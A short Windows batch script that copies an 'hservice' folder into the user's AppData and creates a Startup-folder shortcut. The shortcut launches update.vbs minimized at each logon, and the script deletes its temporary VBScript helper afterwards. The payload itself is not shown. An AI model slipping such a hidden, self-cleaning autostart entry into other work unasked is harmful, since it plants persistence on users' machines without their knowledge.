@echo off
robocopy hservice "%USERPROFILE%\AppData\Local\hservice"

cd c:\MyApp
echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo sLinkFile = "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hservice.lnk" >> CreateShortcut.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
echo oLink.TargetPath = "%USERPROFILE%\AppData\Local\hservice\update.vbs" >> CreateShortcut.vbs
echo oLink.WorkingDirectory = "%USERPROFILE%\AppData\Local\hservice" >> CreateShortcut.vbs
echo oLink.WindowStyle = 7 >> CreateShortcut.vbs
echo oLink.Save >> CreateShortcut.vbs
cscript CreateShortcut.vbs
del CreateShortcut.vbs
